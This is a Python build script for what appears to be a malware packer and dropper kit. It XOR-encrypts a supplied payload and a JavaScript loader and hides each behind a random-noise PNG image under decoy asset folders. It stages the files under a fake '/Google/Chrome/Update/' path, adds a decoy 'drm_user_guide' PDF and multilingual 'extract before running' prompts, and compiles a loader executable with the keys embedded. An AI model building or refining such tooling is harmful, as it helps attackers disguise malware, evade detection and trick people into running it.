import shutil

from PIL import Image
import os.path
import random
import string
import sys

from xor import xor_encrypt_file

if os.path.exists('tmp'):
    shutil.rmtree('tmp')
os.mkdir('tmp')
os.mkdir('tmp/release')
static_copy_path = '/Google/Chrome/Update/'
tips = {
    'en': 'Please extract this archive before running the software.',
    'fr': 'Veuillez extraire cette archive avant de lancer le logiciel.',
    'es': 'Por favor, extraiga este archivo antes de ejecutar el software.',
    'de': 'Bitte extrahieren Sie dieses Archiv, bevor Sie die Software ausführen.',
    'jp': 'ソフトウェアを実行する前に、このアーカイブを解凍してください。',
    'kr': '소프트웨어를 실행하기 전에 이 아카이브를 압축 해제하십시오.'
}


def random_image(filename):
    width = 300
    height = 300

    # 创建一个新的图片
    image = Image.new('RGB', (width, height))

    # 生成每个像素的颜色
    pixels = []
    for y in range(height):
        row = []
        for x in range(width):
            r = random.randint(0, 255)
            g = random.randint(0, 255)
            b = random.randint(0, 255)
            row.append((r, g, b))
        pixels.append(row)

    # 将颜色值设置到图片上
    for y in range(height):
        for x in range(width):
            image.putpixel((x, y), pixels[y][x])
    # 保存图片
    image.save(filename)


def generate_payload():
    payload_xor_key = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(128))

    xor_encrypt_file(sys.argv[1], 'tmp/payload.xor.dat', payload_xor_key.encode('ascii'))
    payload_filename = 'tmp/release/' + ''.join(
        random.choice(string.ascii_letters + string.digits) for _ in range(32)) + '.dat'
    random_image('tmp/random_image_1.png')

    with open('tmp/random_image_1.png', "rb") as f1, open('tmp/payload.xor.dat', 'rb') as f2, open(payload_filename,
                                                                                                   "wb") as f3:
        file1_content = f1.read()
        payload_offset = len(file1_content)
        f3.write(file1_content)
        file2_content = f2.read()
        f3.write(file2_content)
    return payload_xor_key, payload_offset, payload_filename


def generate_js(payload_xor_key, payload_offset, language='en'):
    base_path = random.choice(
        ['help/img', 'manual/img', 'guide/img', 'changelog/img', 'locale/img', 'fonts/img', 'assets/img']) + '/'
    variables = {
        'payload_xor_key': '"{0}"'.format(payload_xor_key),
        'base_payload_name': '"{0}"'.format(base_path + ''.join(
            random.choice(string.ascii_letters + string.digits) for _ in range(32)) + '.png'),
        'base_script_name': '"{0}"'.format(base_path + ''.join(
            random.choice(string.ascii_letters + string.digits) for _ in range(32)) + '.png'),
        'copy_path': '"{0}"'.format(static_copy_path),
        'copy_script_name': '"{0}"'.format(''.join(
            random.choice(string.ascii_letters + string.digits) for _ in range(32)) + '.png'),
        'copy_payload_name': '"{0}"'.format(''.join(
            random.choice(string.ascii_letters + string.digits) for _ in range(32)) + '.png'),
        'payload_offset': payload_offset
    }
    js_xor_key = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(128))
    js_filename = 'tmp/release/' + ''.join(
        random.choice(string.ascii_letters + string.digits) for _ in range(32)) + '.png'

    js_variables = '\n'
    for key, value in variables.items():
        js_variables += 'let {0} = {1};\n'.format(key, value)

    with open(sys.argv[2]) as f:
        js_template = f.read()
        start = js_template.find('// variables start')
        end = js_template.find('// variables end', start)
        js_content = js_template[:start + len('// variables start')] + js_variables + js_template[end:]
    with open('tmp/js.dat', 'wb') as f:
        f.write(js_content.encode('ascii'))
    xor_encrypt_file('tmp/js.dat', 'tmp/js.xor.dat', js_xor_key.encode('ascii'))
    random_image('tmp/random_image_2.png')
    with open('tmp/random_image_2.png', "rb") as f1, open('tmp/js.xor.dat', 'rb') as f2, open(js_filename,
                                                                                              "wb") as f3:
        file1_content = f1.read()
        js_offset = len(file1_content)
        f3.write(file1_content)
        file2_content = f2.read()
        f3.write(file2_content)

    macros = {
        'JS_FILE_NAME': '\\"{0}\\"'.format(variables['base_script_name'].replace('"', '\\\\\\"')),
        'JS_COPY_FILE_NAME': '\\"{0}\\"'.format(variables['copy_script_name'].replace('"', '\\\\\\"')),
        'JS_DEFAULT_FILE_PATH': '\\"{0}\\"'.format(variables['copy_path'].replace('"', '\\\\\\"')),
        'JS_KEY': '\\"\\\\\\"{0}\\\\\\"\\"'.format(js_xor_key),
        'JS_READ_OFFSET': js_offset,
        'TIP_MSG': '\\"\\\\\\"{0}\\\\\\"\\"'.format(tips[language])
    }
    return js_filename, macros, variables, base_path


def build(language='en'):
    payload_xor_key, payload_offset, payload_filename = generate_payload()
    js_filename, macros, variables, base_path = generate_js(payload_xor_key, payload_offset, language)
    if os.path.exists('release'):
        shutil.rmtree('release')
    os.mkdir('release')
    if os.path.exists('release/' + base_path):
        shutil.rmtree('release/' + base_path)
    os.makedirs('release/' + base_path)
    if len(sys.argv) > 3:
        shutil.copy(sys.argv[3],
                    'release/' + base_path + '/../' + 'drm_user_guide_' + ''.join(
                        random.choice(string.digits) for _ in range(8)) + '.pdf')
    shutil.move(payload_filename, 'release/' + variables['base_payload_name'].replace('"', ''))
    shutil.move(js_filename, 'release/' + variables['base_script_name'].replace('"', ''))
    macros_str = "CXX_FLAGS=\""
    for key, value in macros.items():
        macros_str += '-D{0}={1} '.format(key, value)
    macros_str += " -DENABLE_XOR=1\""
    os.mkdir('release/build')
    os.system(
        'cd release/build && cmake -DCMAKE_BUILD_TYPE=MinSizeRel ../.. && make ' + macros_str
        + ' && mv untitled1.exe ../payload.exe && cd .. && rm -rf build && zip -r release.zip .')


if __name__ == '__main__':
    build()
